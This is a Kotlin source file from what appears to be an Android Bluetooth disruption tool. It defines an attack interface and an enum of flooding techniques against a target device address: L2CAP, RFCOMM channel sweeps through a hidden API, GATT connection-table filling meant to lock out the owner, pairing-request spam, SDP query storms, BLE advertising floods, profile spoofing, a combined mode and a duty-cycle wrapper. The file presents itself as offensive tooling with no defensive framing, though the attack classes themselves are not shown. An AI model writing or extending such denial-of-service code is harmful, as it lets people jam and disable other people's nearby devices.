package api

import android.content.Context

/**
 * Common contract for the Bluetooth disruption techniques.
 * Implementations run on their own background coroutines and report progress
 * through [onLog] (called from background threads — the caller marshals to UI).
 */
interface BluetoothAttack {
    val displayName: String
    val description: String
    fun start(context: Context, onLog: (String) -> Unit)
    fun stop()
    fun isRunning(): Boolean
}

/**
 * Selectable attack types. [create] builds the concrete attack for a target,
 * applying the TX/Sleep duty cycle when configured.
 */
enum class AttackType(val displayName: String, val description: String) {
    L2CAP_FLOOD(
        "L2CAP Flood (clásico)",
        "Inunda conexiones RFCOMM/L2CAP con UUIDs aleatorios y satura el socket."
    ),
    RFCOMM_CHANNEL_FLOOD(
        "RFCOMM Channel Flood",
        "Barre canales RFCOMM 1-30 vía reflexión (API oculta) y satura los sockets conectados."
    ),
    GATT_FLOOD(
        "GATT Flood (BLE)",
        "Llena la tabla de conexiones GATT del periférico BLE para bloquear a su dueño."
    ),
    PAIRING_FLOOD(
        "Pairing Flood",
        "Inunda al objetivo de solicitudes de emparejamiento (spam de diálogos)."
    ),
    SDP_FLOOD(
        "SDP Query Storm",
        "Satura el servidor SDP del objetivo con consultas de servicios repetidas."
    ),
    ADVERTISE_FLOOD(
        "Advertising Flood (BLE)",
        "Contamina el canal de anuncios BLE con UUIDs aleatorios."
    ),
    PROFILE_SPOOF(
        "Profile Spoofing",
        "Se hace pasar por perfiles conocidos (A2DP, HID, HFP…) probando conexión con sus UUIDs."
    ),
    COMBO(
        "Combo (L2CAP+RFCOMM+GATT+Pairing+SDP)",
        "Ataque en capas: L2CAP, RFCOMM, GATT, Pairing y SDP simultáneos sobre el mismo objetivo."
    );

    fun create(address: String, params: AttackParams = AttackParams()): BluetoothAttack {
        val base = when (this) {
            L2CAP_FLOOD -> L2capFloodAttack(
                address, params.threads, params.rateDelayMs,
                params.payloadPattern, params.payloadSize, params.bombard
            )
            RFCOMM_CHANNEL_FLOOD -> RfcommChannelFloodAttack(
                address, params.threads, params.rateDelayMs,
                params.payloadPattern, params.payloadSize
            )
            GATT_FLOOD -> GattFloodAttack(address, params.threads, params.rateDelayMs)
            PAIRING_FLOOD -> PairingFloodAttack(address, params.threads, params.rateDelayMs)
            SDP_FLOOD -> SdpFloodAttack(address, params.threads, params.rateDelayMs)
            ADVERTISE_FLOOD -> AdvertiseFloodAttack(address)
            PROFILE_SPOOF -> ProfileSpoofAttack(address, params.threads, params.rateDelayMs)
            COMBO -> ComboAttack(
                address, params.threads, params.rateDelayMs,
                params.payloadPattern, params.payloadSize, params.bombard
            )
        }
        return if (params.txSeconds >= 1 && params.sleepSeconds >= 1) {
            DutyCycleAttack(base, params.txSeconds, params.sleepSeconds)
        } else {
            base
        }
    }
}
